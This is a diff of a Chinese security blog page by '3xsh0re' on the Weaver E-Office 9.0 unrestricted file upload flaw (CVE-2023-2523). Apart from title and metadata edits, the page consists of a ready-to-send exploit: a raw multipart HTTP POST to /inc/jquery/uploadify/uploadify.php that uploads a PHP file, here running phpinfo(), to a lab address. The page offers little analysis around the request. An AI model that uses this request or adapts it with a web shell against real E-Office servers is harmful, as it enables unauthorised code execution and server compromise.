@@ -16,15 +16,15 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="泛微 OA 代码执行 EXP描述和影响范围Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。 Weaver E-Office9.0 POC or EXP123456789101112131415161718192">
+    <meta name="description" content="泛微E-Office9文件上传漏洞(CVE-2023-2523)描述和影响范围Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传 Weaver E-Office9.0 POC or EXP1234567891011">
 <meta property="og:type" content="article">
 <meta property="og:title" content="泛微OA_Weaver_E-Office9.0文件上传漏洞">
 <meta property="og:url" content="https://remixxyh.github.io/2023/08/10/%E6%B3%9B%E5%BE%AEOA-Weaver-E-Office9-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="3xsh0re">
-<meta property="og:description" content="泛微 OA 代码执行 EXP描述和影响范围Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。 Weaver E-Office9.0 POC or EXP123456789101112131415161718192">
+<meta property="og:description" content="泛微E-Office9文件上传漏洞(CVE-2023-2523)描述和影响范围Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传 Weaver E-Office9.0 POC or EXP1234567891011">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-10T01:17:01.000Z">
-<meta property="article:modified_time" content="2023-08-10T02:07:13.220Z">
+<meta property="article:modified_time" content="2023-08-11T02:43:19.389Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="泛微OA">
 <meta property="article:tag" content="POC">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          941 字
+          961 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          8 分钟
+          9 分钟
         
       </span>
     
@@ -311,9 +311,9 @@
             
               <div class="markdown-body">
                 
-                <h2 id="泛微-OA-代码执行-EXP"><a href="#泛微-OA-代码执行-EXP" class="headerlink" title="泛微 OA 代码执行 EXP"></a>泛微 OA 代码执行 EXP</h2><h3 id="描述和影响范围"><a href="#描述和影响范围" class="headerlink" title="描述和影响范围"></a><strong>描述和影响范围</strong></h3><p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。</p>
+                <h2 id="泛微E-Office9文件上传漏洞-CVE-2023-2523"><a href="#泛微E-Office9文件上传漏洞-CVE-2023-2523" class="headerlink" title="泛微E-Office9文件上传漏洞(CVE-2023-2523)"></a>泛微E-Office9文件上传漏洞(CVE-2023-2523)</h2><h3 id="描述和影响范围"><a href="#描述和影响范围" class="headerlink" title="描述和影响范围"></a>描述和影响范围</h3><p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传</p>
 <p>Weaver E-Office9.0</p>
-<h3 id="POC-or-EXP"><a href="#POC-or-EXP" class="headerlink" title="POC or EXP"></a><strong>POC or EXP</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/inc/jquery/uploadify/uploadify.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8082<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>test<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>493<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85<br><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;Filedata&quot;</span>; filename=<span class="hljs-string">&quot;666.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></code></pre></td></tr></table></figure>
+<h3 id="POC-or-EXP"><a href="#POC-or-EXP" class="headerlink" title="POC or EXP"></a>POC or EXP</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/inc/jquery/uploadify/uploadify.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8082<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>test<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>493<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85<br><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;Filedata&quot;</span>; filename=<span class="hljs-string">&quot;666.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -406,9 +406,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/10/%E9%80%9A%E8%BE%BEOA-CVE-2023-4166/" title="通达OA-CVE-2023-4166">
+                      <a href="/2023/08/10/%E9%80%9A%E8%BE%BEOA-CVE-2023-4166/" title="通达OA_sql注入漏洞-CVE-2023-4166">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">通达OA-CVE-2023-4166</span>
+                        <span class="hidden-mobile">通达OA_sql注入漏洞-CVE-2023-4166</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
